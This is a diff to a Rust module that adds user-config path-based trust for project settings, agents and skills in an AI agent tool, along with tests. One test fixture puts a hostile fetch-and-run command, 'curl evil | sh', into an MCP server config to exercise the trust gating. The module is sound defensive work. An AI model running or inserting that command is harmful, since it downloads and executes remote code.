@@ -8,17 +8,25 @@
 //! skills. Trust is recorded in `$XDG_STATE_HOME/kage/trust.json` as
 //! the exact values that were approved, keyed by the canonical
 //! project directory. Any later edit to a gated value makes the
-//! project untrusted again. `providers`, `acp`, `plugins.registry`
-//! and the media tables under `[tools]` never apply from a project,
-//! trusted or not.
+//! project untrusted again. `providers`, `acp`, `trust`,
+//! `plugins.registry` and the media tables under `[tools]` never
+//! apply from a project, trusted or not.
+//!
+//! The user config's `[trust]` table is a second, standing source:
+//! `paths` fully trusts every project at or under a listed
+//! directory, `parts` trusts only the named [`TrustPart`]s under
+//! one. Unlike a stored record it never expires when the project's
+//! files change, and it is never written to the store.
 
-use std::collections::BTreeMap;
+use std::collections::{BTreeMap, BTreeSet};
 use std::path::{Path, PathBuf};
 
+use figment::Figment;
+use figment::providers::{Env, Format, Toml};
 use serde::{Deserialize, Serialize};
 use serde_json::Value;
 
-use crate::config::Config;
+use crate::config::{Config, TrustConfig, TrustPart};
 use crate::error::{Error, Result};
 
 const STORE_VERSION: u32 = 1;
@@ -60,32 +68,161 @@ struct Store {
     projects: BTreeMap<String, Value>,
 }
 
+/// How the user config's `[trust]` table covers a project directory:
+/// full trust from `paths`, the union of the parts from matching
+/// `parts` entries, and the entries that matched, as written in the
+/// config.
+#[derive(Clone, Debug, Default, PartialEq, Eq)]
+pub struct StandingTrust {
+    /// A `[trust] paths` entry covers the project: every gated part
+    /// is trusted.
+    pub full: bool,
+    /// The parts the matching `[trust] parts` entries trust.
+    pub parts: BTreeSet<TrustPart>,
+    /// Every matching entry as written: the `paths` entries, then the
+    /// `parts` keys.
+    pub entries: Vec<String>,
+}
+
+impl StandingTrust {
+    /// The trusted part names, comma-separated, for messages.
+    #[must_use]
+    pub fn part_list(&self) -> String {
+        self.parts
+            .iter()
+            .map(|part| part.as_str())
+            .collect::<Vec<_>>()
+            .join(", ")
+    }
+}
+
+/// The `[trust]` coverage of `workdir` from the user config. Both
+/// sides have `~` expanded and symlinks resolved, then compare by
+/// path components, so `~/dev` never matches `~/devil`; an entry
+/// naming a directory that does not exist matches nothing. Entries
+/// must name an absolute path: a relative one is rejected when the
+/// config loads, and matches nothing here, because it would resolve
+/// against the directory kage was started in, which for this check
+/// is the project itself.
+#[must_use]
+pub fn standing_trust(workdir: &Path) -> StandingTrust {
+    let mut out = StandingTrust::default();
+    let trust = user_trust();
+    let Some(dir) = std::fs::canonicalize(workdir).ok() else {
+        return out;
+    };
+    for entry in &trust.paths {
+        if let Some(base) = existing_path(entry, &dir)
+            && dir.starts_with(&base)
+        {
+            out.full = true;
+            out.entries.push(entry.display().to_string());
+        }
+    }
+    for (key, parts) in &trust.parts {
+        if let Some(base) = existing_path(Path::new(key), &dir)
+            && dir.starts_with(&base)
+        {
+            out.parts.extend(parts.iter().copied());
+            out.entries.push(key.clone());
+        }
+    }
+    out
+}
+
+/// `entry` with a leading `~` expanded and symlinks resolved, or
+/// `None` when it names no existing path: such an entry matches
+/// nothing. A relative entry matches nothing too: the config load
+/// rejects it, and reading the `[trust]` table without validation
+/// must not honor what the load would refuse. A bare root (`/` or
+/// `C:\`) is the root of `anchor`'s drive, since Windows cannot
+/// canonicalize a bare root and `/` means the current drive there
+/// anyway.
+fn existing_path(entry: &Path, anchor: &Path) -> Option<PathBuf> {
+    let expanded = crate::fsutil::expand_tilde(entry);
+    if !expanded.has_root() {
+        return None;
+    }
+    if expanded.parent().is_none() {
+        return anchor.ancestors().last().map(Path::to_path_buf);
+    }
+    std::fs::canonicalize(expanded).ok()
+}
+
+/// The `[trust]` table from the user layer only: the user config file
+/// plus `KAGE_` env overrides, never the project's own `[trust]`, so
+/// a repo cannot trust itself. Only the `trust` profile is extracted
+/// rather than a whole second [`Config`] load. A table that fails to
+/// parse reads as empty here; the config load reports the error.
+fn user_trust() -> TrustConfig {
+    let Some(path) = Config::default_path() else {
+        return TrustConfig::default();
+    };
+    Figment::new()
+        .merge(Toml::file(path))
+        .merge(Env::prefixed("KAGE_").split("__"))
+        .extract_inner("trust")
+        .unwrap_or_default()
+}
+
+/// The part that standing-trusts top-level config `key`: the gated
+/// sub-keys of `provider`, and any key kage does not know, are
+/// covered only by full `paths` trust or a stored record.
+fn part_for_key(key: &str) -> Option<TrustPart> {
+    match key {
+        "mcp" => Some(TrustPart::Mcp),
+        "permissions" => Some(TrustPart::Permissions),
+        "tools" => Some(TrustPart::Tools),
+        "shell" => Some(TrustPart::Shell),
+        "plugins" => Some(TrustPart::Plugins),
+        _ => None,
+    }
+}
+
 /// Summary of the project's gated settings when they are present and
 /// not trusted. `None` when the project sets only safe keys and has
-/// no agents or skills, or its current gated values are trusted.
+/// no agents or skills, everything is covered by the user config's
+/// `[trust]`, or the current gated values are trusted. Only the
+/// parts no `[trust]` entry covers reach the summary, so a prompt
+/// asks for those alone.
 #[must_use]
 pub fn untrusted_project(workdir: &Path) -> Option<TrustSummary> {
-    let subset = risky_subset(workdir, project_table(workdir).map(|(t, _)| t).as_ref())?;
+    let (subset, _) = untrusted_subset(workdir)?;
     if is_trusted(workdir, &subset) {
         return None;
     }
     Some(summarize(workdir, &subset))
 }
 
-/// Whether `workdir`'s project extensions (agents and skills) may load:
-/// the project has nothing that needs trust, or its current gated
-/// settings are trusted.
+/// Whether `workdir`'s project may load `part`: the user config's
+/// `[trust]` covers it, or the project has nothing gated at all, or
+/// its untrusted remainder is covered by a stored record.
 #[must_use]
-pub fn project_extensions_trusted(workdir: &Path) -> bool {
-    untrusted_project(workdir).is_none()
+pub fn project_part_trusted(workdir: &Path, part: TrustPart) -> bool {
+    match untrusted_subset(workdir) {
+        None => true,
+        Some((subset, standing)) => standing.parts.contains(&part) || is_trusted(workdir, &subset),
+    }
+}
+
+/// The gated settings and files of `workdir` that standing trust does
+/// not cover, with that standing trust, or `None` when nothing is
+/// gated or everything is covered. The `[trust]` table is read only
+/// once something is gated, so a plain directory never pays for it.
+fn untrusted_subset(workdir: &Path) -> Option<(Value, StandingTrust)> {
+    let mut subset = risky_subset(workdir, project_table(workdir).map(|(t, _)| t).as_ref())?;
+    let standing = standing_trust(workdir);
+    subtract_standing(&mut subset, &standing).then_some((subset, standing))
 }
 
 /// Trust the current gated settings of `workdir`'s project when they
-/// still match `presented`, the summary the user approved. The
-/// settings are re-derived from disk and compared before anything is
-/// stored, so a project edited between the prompt and the approval is
-/// refused instead of being trusted unseen. Returns what was trusted,
-/// or `None` when there was nothing left to trust.
+/// still match `presented`, the summary the user approved. Only the
+/// parts no `[trust]` entry covers are stored, so a later `kage
+/// trust` approves just those. The settings are re-derived from disk
+/// and compared before anything is stored, so a project edited
+/// between the prompt and the approval is refused instead of being
+/// trusted unseen. Returns what was trusted, or `None` when there was
+/// nothing left to trust.
 ///
 /// # Errors
 ///
@@ -93,8 +230,7 @@ pub fn project_extensions_trusted(workdir: &Path) -> bool {
 /// trust store cannot be read, parsed or written, or there is no home
 /// directory to hold it.
 pub fn trust_project(workdir: &Path, presented: &TrustSummary) -> Result<Option<TrustSummary>> {
-    let Some(subset) = risky_subset(workdir, project_table(workdir).map(|(t, _)| t).as_ref())
-    else {
+    let Some((subset, _)) = untrusted_subset(workdir) else {
         return Ok(None);
     };
     if &summarize(workdir, &subset) != presented {
@@ -125,22 +261,27 @@ pub fn revoke_project(workdir: &Path) -> Result<bool> {
 
 /// The project TOML an untrusted project may set: the tables it may
 /// never set removed by [`project_table`], and, while untrusted,
-/// everything outside [`UNTRUSTED_SAFE_KEYS`]. `None` means the file
+/// everything outside [`UNTRUSTED_SAFE_KEYS`] except the tables whose
+/// part the user config's `[trust]` covers. `None` means the file
 /// applies as is.
 pub(crate) fn filtered_project(workdir: &Path) -> Option<String> {
     let (mut table, mut changed) = project_table(workdir)?;
-    if !config_subset(&table).is_empty()
-        && !is_trusted(workdir, &risky_subset(workdir, Some(&table))?)
-    {
-        retain_safe(&mut table);
-        changed = true;
+    if !config_subset(&table).is_empty() {
+        let mut subset = risky_subset(workdir, Some(&table))?;
+        let standing = standing_trust(workdir);
+        if subtract_standing(&mut subset, &standing) && !is_trusted(workdir, &subset) {
+            retain_trusted(&mut table, &standing);
+            changed = true;
+        }
     }
     changed.then(|| toml::to_string(&table).ok()).flatten()
 }
 
-/// The project TOML without the tables a project may never set, and
-/// whether it had any. Trust is asked for and checked on this table, so
-/// a table that never applies is neither shown nor part of the approval.
+/// The project TOML without the tables a project may never set
+/// (including its own `[trust]`, which could otherwise trust the
+/// project from inside), and whether it had any. Trust is asked for
+/// and checked on this table, so a table that never applies is
+/// neither shown nor part of the approval.
 fn project_table(workdir: &Path) -> Option<(toml::Table, bool)> {
     const MEDIA_TABLES: &[&str] = &[
         "generate_image",
@@ -166,8 +307,11 @@ fn project_table(workdir: &Path) -> Option<(toml::Table, bool)> {
                 removed | tools.remove(*name).is_some()
             })
         });
-    let changed =
-        table.remove("providers").is_some() | table.remove("acp").is_some() | registry | media;
+    let changed = table.remove("providers").is_some()
+        | table.remove("acp").is_some()
+        | table.remove("trust").is_some()
+        | registry
+        | media;
     Some((table, changed))
 }
 
@@ -187,6 +331,25 @@ fn risky_subset(workdir: &Path, table: Option<&toml::Table>) -> Option<Value> {
         out.insert("skills".to_owned(), Value::Object(skills));
     }
     (!out.is_empty()).then_some(Value::Object(out))
+}
+
+/// Drop from `subset` everything `standing` covers, full trust
+/// covering all of it. Returns whether anything is left to ask for:
+/// what remains is what the prompt shows and the stored record is
+/// written for and compared against.
+fn subtract_standing(subset: &mut Value, standing: &StandingTrust) -> bool {
+    if standing.full {
+        return false;
+    }
+    let Some(map) = subset.as_object_mut() else {
+        return false;
+    };
+    map.retain(|key, _| match key.as_str() {
+        "agents" => !standing.parts.contains(&TrustPart::Agents),
+        "skills" => !standing.parts.contains(&TrustPart::Skills),
+        key => !part_for_key(key).is_some_and(|part| standing.parts.contains(&part)),
+    });
+    !map.is_empty()
 }
 
 /// The gated parts of the project `table`: every key outside
@@ -239,15 +402,18 @@ fn gated_part(key: &str, value: &toml::Value) -> Option<toml::Value> {
     (!gated.is_empty()).then_some(toml::Value::Table(gated))
 }
 
-/// Keep in `table` only what [`UNTRUSTED_SAFE_KEYS`] allows: gated
-/// keys out, and under the partially safe tables their gated
-/// sub-keys.
-fn retain_safe(table: &mut toml::Table) {
+/// Keep in `table` only what an untrusted project may set: what
+/// [`UNTRUSTED_SAFE_KEYS`] allows plus the gated keys whose part
+/// standing trust covers, and under the partially safe tables their
+/// gated sub-keys in the same way.
+fn retain_trusted(table: &mut toml::Table, standing: &StandingTrust) {
+    let trusted = |key: &str| part_for_key(key).is_some_and(|part| standing.parts.contains(&part));
     table.retain(|key, value| {
         let Some(subkeys) = safe_subkeys(key) else {
-            return false;
+            return trusted(key);
         };
         if !subkeys.is_empty()
+            && !trusted(key)
             && let Some(sub) = value.as_table_mut()
         {
             sub.retain(|name, _| subkeys.contains(&name));
@@ -661,7 +827,9 @@ mod tests {
         figment::Error::from(e.to_string())
     }
 
-    fn setup(jail: &mut figment::Jail, project_toml: &str) -> figment::error::Result<PathBuf> {
+    /// Point the jail's home, config and state at itself and return
+    /// its root, so `~` in a `[trust]` entry expands inside the jail.
+    fn env(jail: &mut figment::Jail) -> PathBuf {
         let root = jail.directory().to_path_buf();
         jail.set_env("HOME", root.to_string_lossy().as_ref());
         jail.set_env(
@@ -672,6 +840,11 @@ mod tests {
             "XDG_STATE_HOME",
             root.join("state").to_string_lossy().as_ref(),
         );
+        root
+    }
+
+    fn setup(jail: &mut figment::Jail, project_toml: &str) -> figment::error::Result<PathBuf> {
+        let root = env(jail);
         let project = root.join("project");
         std::fs::create_dir_all(project.join(".kage")).map_err(io)?;
         write_project(&project, project_toml)?;
@@ -680,6 +853,25 @@ mod tests {
 
     fn write_project(project: &Path, body: &str) -> figment::error::Result<()> {
         std::fs::write(Config::project_path(project), body).map_err(io)
+    }
+
+    /// Write the user config the jail's `XDG_CONFIG_HOME` resolves to.
+    fn write_user_config(jail: &figment::Jail, body: &str) -> figment::error::Result<()> {
+        let user = jail.directory().join("config").join("kage");
+        std::fs::create_dir_all(&user).map_err(io)?;
+        std::fs::write(user.join("config.toml"), body).map_err(io)
+    }
+
+    /// A project at `root/relative` with the given config body.
+    fn project_at(
+        root: &Path,
+        relative: &str,
+        project_toml: &str,
+    ) -> figment::error::Result<PathBuf> {
+        let project = root.join(relative);
+        std::fs::create_dir_all(project.join(".kage")).map_err(io)?;
+        write_project(&project, project_toml)?;
+        Ok(project)
     }
 
     fn load(project: &Path) -> figment::error::Result<Config> {
@@ -793,7 +985,7 @@ mod tests {
             )?;
             assert!(trust_project(&project, &presented).is_err());
             assert!(untrusted_project(&project).is_some());
-            assert!(!project_extensions_trusted(&project));
+            assert!(!project_part_trusted(&project, TrustPart::Agents));
             Ok(())
         });
     }
@@ -871,7 +1063,7 @@ mod tests {
                     .map_err(io)?
                     .is_none()
             );
-            assert!(project_extensions_trusted(&project));
+            assert!(project_part_trusted(&project, TrustPart::Agents));
             std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o644)).map_err(io)?;
             let summary = untrusted_project(&project).expect("readable ghost agent asks for trust");
             assert!(summary.agents.contains(&"ghost".to_owned()));
@@ -888,7 +1080,7 @@ mod tests {
             assert!(untrusted_project(&project).is_none());
 
             write_agent_in(&project, 1, "scout", REVIEWER)?;
-            assert!(!project_extensions_trusted(&project));
+            assert!(!project_part_trusted(&project, TrustPart::Agents));
             let summary = untrusted_project(&project).expect("untrusted");
             assert_eq!(summary.keys, ["agents"]);
             assert_eq!(summary.agents, ["scout"]);
@@ -911,14 +1103,14 @@ mod tests {
             // covered by trust.
             let presented = untrusted_project(&project).expect("untrusted");
             trust_project(&project, &presented).map_err(io)?;
-            assert!(project_extensions_trusted(&project));
+            assert!(project_part_trusted(&project, TrustPart::Agents));
             write_agent_in(
                 &project,
                 0,
                 "scout",
                 &REVIEWER.replace("read", "read, shell"),
             )?;
-            assert!(project_extensions_trusted(&project));
+            assert!(project_part_trusted(&project, TrustPart::Agents));
             Ok(())
         });
     }
@@ -930,11 +1122,11 @@ mod tests {
             let project = setup(jail, "")?;
             std::fs::remove_file(Config::project_path(&project)).map_err(io)?;
             assert!(untrusted_project(&project).is_none());
-            assert!(project_extensions_trusted(&project));
+            assert!(project_part_trusted(&project, TrustPart::Agents));
 
             write_agent(&project, "reviewer", REVIEWER)?;
             write_agent(&project, "auditor", REVIEWER)?;
-            assert!(!project_extensions_trusted(&project));
+            assert!(!project_part_trusted(&project, TrustPart::Agents));
             let summary = untrusted_project(&project).expect("untrusted");
             assert_eq!(summary.path, project.join(".kage"));
             assert_eq!(summary.keys, ["agents"]);
@@ -951,7 +1143,7 @@ mod tests {
             trust_project(&project, presented)
                 .map_err(io)?
                 .expect("agents to trust");
-            assert!(project_extensions_trusted(&project));
+            assert!(project_part_trusted(&project, TrustPart::Agents));
             assert!(untrusted_project(&project).is_none());
 
             write_agent(
@@ -959,13 +1151,13 @@ mod tests {
                 "reviewer",
                 &REVIEWER.replace("read", "read, shell"),
             )?;
-            assert!(!project_extensions_trusted(&project));
+            assert!(!project_part_trusted(&project, TrustPart::Agents));
             let presented = untrusted_project(&project).expect("untrusted");
             trust_project(&project, &presented).map_err(io)?;
-            assert!(project_extensions_trusted(&project));
+            assert!(project_part_trusted(&project, TrustPart::Agents));
 
             write_agent(&project, "extra", REVIEWER)?;
-            assert!(!project_extensions_trusted(&project));
+            assert!(!project_part_trusted(&project, TrustPart::Agents));
             Ok(())
         });
     }
@@ -1010,12 +1202,12 @@ mod tests {
                     .items
                     .contains(&"project agent reviewer (.kage/agents/reviewer.md)".to_owned())
             );
-            assert!(!project_extensions_trusted(&project));
+            assert!(!project_part_trusted(&project, TrustPart::Agents));
             assert_dropped(&load(&project)?);
 
             let presented = untrusted_project(&project).expect("untrusted");
             trust_project(&project, &presented).map_err(io)?;
-            assert!(project_extensions_trusted(&project));
+            assert!(project_part_trusted(&project, TrustPart::Agents));
             assert_applied(&load(&project)?);
             Ok(())
         });
@@ -1045,16 +1237,16 @@ mod tests {
                     .items
                     .contains(&"project skill helper (.kage/skills/helper/SKILL.md)".to_owned())
             );
-            assert!(!project_extensions_trusted(&project));
+            assert!(!project_part_trusted(&project, TrustPart::Agents));
             assert_dropped(&load(&project)?);
 
             let presented = untrusted_project(&project).expect("untrusted");
             trust_project(&project, &presented).map_err(io)?;
-            assert!(project_extensions_trusted(&project));
+            assert!(project_part_trusted(&project, TrustPart::Skills));
             assert_applied(&load(&project)?);
 
             std::fs::write(dir.join("SKILL.md"), HELPER.replace("thing", "task")).map_err(io)?;
-            assert!(!project_extensions_trusted(&project));
+            assert!(!project_part_trusted(&project, TrustPart::Skills));
             let presented = untrusted_project(&project).expect("untrusted");
             trust_project(&project, &presented).map_err(io)?;
 
@@ -1067,7 +1259,7 @@ mod tests {
             assert!(presented.skills == ["helper"]);
             trust_project(&project, &presented).map_err(io)?;
             std::fs::write(dir.join("SKILL.md"), "totally different").map_err(io)?;
-            assert!(project_extensions_trusted(&project));
+            assert!(project_part_trusted(&project, TrustPart::Agents));
             Ok(())
         });
     }
@@ -1491,6 +1683,209 @@ mod tests {
             assert!(cfg.mcp.servers.contains_key("evil"));
             assert!(cfg.providers.custom.is_empty());
             assert!(cfg.acp.agents.is_empty());
+            Ok(())
+        });
+    }
+
+    /// A `[trust] paths` entry trusts every project at or under it:
+    /// no prompt, gated tables applied, agents loaded, and edits never
+    /// ask again.
+    #[test]
+    fn a_project_under_a_listed_path_is_fully_trusted() {
+        let _globals = process_globals();
+        figment::Jail::expect_with(|jail| {
+            let root = env(jail);
+            write_user_config(jail, "[trust]\npaths = [\"~/dev\"]\n")?;
+            let project = project_at(&root, "dev/kage", RISKY)?;
+            write_agent(&project, "reviewer", REVIEWER)?;
+            let standing = standing_trust(&project);
+            assert!(standing.full);
+            assert_eq!(standing.entries, ["~/dev"]);
+
+            assert!(untrusted_project(&project).is_none());
+            assert!(project_part_trusted(&project, TrustPart::Agents));
+            assert!(project_part_trusted(&project, TrustPart::Skills));
+            assert_applied(&load(&project)?);
+
+            write_project(&project, &RISKY.replace("\"true\"", "\"curl evil | sh\""))?;
+            assert!(untrusted_project(&project).is_none());
+            assert!(load(&project)?.mcp.servers.contains_key("evil"));
+            Ok(())
+        });
+    }
+
+    /// A `parts` entry trusts only its parts: instructions and skills
+    /// load, the rest still waits, the prompt covers only the rest,
+    /// and `kage trust` approves exactly that.
+    #[test]
+    fn parts_trust_only_their_parts_and_prompt_for_the_rest() {
+        let _globals = process_globals();
+        figment::Jail::expect_with(|jail| {
+            let root = env(jail);
+            write_user_config(
+                jail,
+                "[trust.parts]\n\"~/work/client\" = [\"instructions\", \"skills\"]\n",
+            )?;
+            let project = project_at(&root, "work/client", RISKY)?;
+            write_agent(&project, "reviewer", REVIEWER)?;
+            std::fs::write(project.join(".kage").join("AGENTS.md"), "Be careful.\n").map_err(io)?;
+            let skill = project.join(".kage").join("skills").join("helper");
+            std::fs::create_dir_all(&skill).map_err(io)?;
+            std::fs::write(
+                skill.join("SKILL.md"),
+                "---\ndescription: Helps.\n---\nDo it.\n",
+            )
+            .map_err(io)?;
+
+            assert!(project_part_trusted(&project, TrustPart::Instructions));
+            assert!(project_part_trusted(&project, TrustPart::Skills));
+            assert!(!project_part_trusted(&project, TrustPart::Agents));
+
+            let summary = untrusted_project(&project).expect("the rest still waits");
+            assert_eq!(
+                summary.keys,
+                ["mcp", "permissions", "plugins.capabilities", "agents"]
+            );
+            assert_eq!(summary.agents, ["reviewer"]);
+            assert!(summary.skills.is_empty());
+            assert_dropped(&load(&project)?);
+
+            let presented = untrusted_project(&project).expect("untrusted");
+            trust_project(&project, &presented)
+                .map_err(io)?
+                .expect("something to trust");
+            assert!(untrusted_project(&project).is_none());
+            assert!(project_part_trusted(&project, TrustPart::Agents));
+            assert_applied(&load(&project)?);
+            Ok(())
+        });
+    }
+
+    #[test]
+    fn an_unknown_part_name_is_a_config_error() {
+        let _globals = process_globals();
+        figment::Jail::expect_with(|jail| {
+            let root = env(jail);
+            write_user_config(jail, "[trust.parts]\n\"~/x\" = [\"nonsense\"]\n")?;
+            let project = project_at(&root, "project", "")?;
+            let err = load(&project).expect_err("unknown part is a config error");
+            assert!(err.to_string().contains("nonsense"), "{err}");
+            Ok(())
+        });
+    }
+
+    /// A relative entry would resolve against the directory kage was
+    /// started in, which for the trust check is the project itself,
+    /// so `"."` would trust every project: relative entries are a
+    /// config error, and match nothing even when the `[trust]` table
+    /// is read without validation.
+    #[test]
+    fn a_relative_trust_entry_is_a_config_error() {
+        let _globals = process_globals();
+        figment::Jail::expect_with(|jail| {
+            let root = env(jail);
+            write_user_config(jail, "[trust]\npaths = [\"project\"]\n")?;
+            let project = project_at(&root, "project", RISKY)?;
+            let err = load(&project).expect_err("relative entry is a config error");
+            assert!(err.to_string().contains("not an absolute path"), "{err}");
+            assert!(!standing_trust(&project).full);
+
+            write_user_config(jail, "[trust.parts]\n\"project\" = [\"mcp\"]\n")?;
+            let err = load(&project).expect_err("relative parts key is a config error");
+            assert!(
+                err.to_string().contains("[trust.parts] key \"project\""),
+                "{err}"
+            );
+            assert!(standing_trust(&project).parts.is_empty());
+            Ok(())
+        });
+    }
+
+    /// Matching compares whole path components and only existing
+    /// entries, so `~/dev` never trusts `~/devil`.
+    #[test]
+    fn a_prefix_sharing_sibling_and_a_missing_entry_match_nothing() {
+        let _globals = process_globals();
+        figment::Jail::expect_with(|jail| {
+            let root = env(jail);
+            write_user_config(jail, "[trust]\npaths = [\"~/dev\", \"~/gone\"]\n")?;
+            let project = project_at(&root, "devil/project", RISKY)?;
+            assert!(!standing_trust(&project).full);
+            assert!(untrusted_project(&project).is_some());
+            Ok(())
+        });
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn a_symlinked_project_dir_under_a_listed_path_is_trusted() {
+        let _globals = process_globals();
+        figment::Jail::expect_with(|jail| {
+            let root = env(jail);
+            write_user_config(jail, "[trust]\npaths = [\"~/dev\"]\n")?;
+            let project = project_at(&root, "dev/kage", RISKY)?;
+            std::os::unix::fs::symlink(&project, root.join("alias")).map_err(io)?;
+            assert!(untrusted_project(&root.join("alias")).is_none());
+            Ok(())
+        });
+    }
+
+    /// A project's own `[trust]` table never applies: it is stripped
+    /// like `providers`, so a repo cannot trust itself.
+    #[test]
+    fn a_projects_own_trust_table_does_not_trust_it() {
+        let _globals = process_globals();
+        figment::Jail::expect_with(|jail| {
+            let root = env(jail);
+            let project = project_at(&root, "project", "")?;
+            let self_trust = format!(
+                "[trust]\npaths = [\"{}\"]\n",
+                project.display().to_string().replace('\\', "\\\\")
+            );
+            write_project(&project, &format!("{RISKY}\n{self_trust}"))?;
+
+            assert!(untrusted_project(&project).is_some());
+            assert!(load(&project)?.trust.is_default());
+            Ok(())
+        });
+    }
+
+    /// The `parts` key `"/"` trusts its parts for every project.
+    #[test]
+    fn a_root_parts_entry_trusts_every_project() {
+        let _globals = process_globals();
+        figment::Jail::expect_with(|jail| {
+            let root = env(jail);
+            write_user_config(jail, "[trust.parts]\n\"/\" = [\"instructions\"]\n")?;
+            let project = project_at(&root, "anywhere/project", RISKY)?;
+            assert!(project_part_trusted(&project, TrustPart::Instructions));
+            assert!(!project_part_trusted(&project, TrustPart::Agents));
+            Ok(())
+        });
+    }
+
+    /// Several matching entries union their parts, and a `paths` entry
+    /// still covers everything.
+    #[test]
+    fn several_matching_entries_union_their_parts() {
+        let _globals = process_globals();
+        figment::Jail::expect_with(|jail| {
+            let root = env(jail);
+            write_user_config(
+                jail,
+                "[trust.parts]\n\"~/a\" = [\"instructions\"]\n\"~/a/b\" = [\"skills\"]\n",
+            )?;
+            let project = project_at(&root, "a/b/project", RISKY)?;
+            assert!(project_part_trusted(&project, TrustPart::Instructions));
+            assert!(project_part_trusted(&project, TrustPart::Skills));
+            assert!(!project_part_trusted(&project, TrustPart::Mcp));
+
+            write_user_config(
+                jail,
+                "[trust]\npaths = [\"~/a\"]\n\n[trust.parts]\n\"~/a/b\" = [\"skills\"]\n",
+            )?;
+            assert!(project_part_trusted(&project, TrustPart::Mcp));
+            assert!(untrusted_project(&project).is_none());
             Ok(())
         });
     }
